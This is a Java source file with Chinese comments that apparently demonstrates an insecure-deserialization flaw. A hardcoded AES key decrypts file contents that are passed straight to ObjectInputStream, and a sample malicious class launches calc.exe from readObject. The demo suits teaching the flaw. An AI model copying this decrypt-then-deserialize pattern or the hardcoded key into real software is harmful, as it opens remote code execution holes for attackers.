import java.io.*;
import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;
import java.nio.file.*;
import java.security.*;
import java.util.Base64;

public class FileEncryptor {
    
    // 模拟加密密钥（实际开发中应安全存储）
    private static final String KEY = "1234567890123456";
    
    // 漏洞点：不安全的反序列化方法
    public static Object decryptObjectFromFile(String filePath) throws Exception {
        byte[] encryptedData = Files.readAllBytes(Paths.get(filePath));
        Cipher cipher = Cipher.getInstance("AES");
        SecretKeySpec keySpec = new SecretKeySpec(KEY.getBytes(), "AES");
        cipher.init(Cipher.DECRYPT_MODE, keySpec);
        
        // 直接反序列化解密后的数据（危险！）
        try (ObjectInputStream ois = new ObjectInputStream(
             new ByteArrayInputStream(cipher.doFinal(encryptedData)))) {
            return ois.readObject();
        }
    }
    
    // 安全加密方法（但漏洞在解密端）
    public static void encryptObjectToFile(Object obj, String filePath) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        SecretKeySpec keySpec = new SecretKeySpec(KEY.getBytes(), "AES");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec);
        
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(obj);
            byte[] encryptedData = cipher.doFinal(bos.toByteArray());
            Files.write(Paths.get(filePath), encryptedData);
        }
    }
    
    // 可序列化的业务类（可能被攻击者利用）
    public static class EncryptedData implements Serializable {
        private String content;
        private int accessLevel;
        
        public EncryptedData(String content, int accessLevel) {
            this.content = content;
            this.accessLevel = accessLevel;
        }
        
        // 模拟敏感操作
        private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException {
            stream.defaultReadObject();
            if (accessLevel > 5) {
                Runtime.getRuntime().exec("calc.exe");  // 模拟危险操作
            }
        }
    }
    
    // 模拟攻击者构造的恶意类
    public static class MaliciousPayload implements Serializable {
        private static final long serialVersionUID = 1L;
        
        private void readObject(ObjectInputStream stream) throws IOException {
            try {
                // 模拟任意代码执行
                Runtime.getRuntime().exec("calc.exe");
            } catch (Exception e) {
                throw new IOException("Exploit failed");
            }
        }
    }
    
    // 测试代码
    public static void main(String[] args) {
        try {
            // 正常使用示例
            EncryptedData data = new EncryptedData("secret_data", 3);
            encryptObjectToFile(data, "data.enc");
            EncryptedData restored = (EncryptedData) decryptObjectFromFile("data.enc");
            System.out.println("Decrypted content: " + restored.content);
            
            // 漏洞利用演示（模拟攻击）
            System.out.println("\
[模拟攻击] 创建恶意加密文件...");
            encryptObjectToFile(new MaliciousPayload(), "malicious.enc");
            System.out.println("正在解密恶意文件（触发漏洞）...");
            decryptObjectFromFile("malicious.enc");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}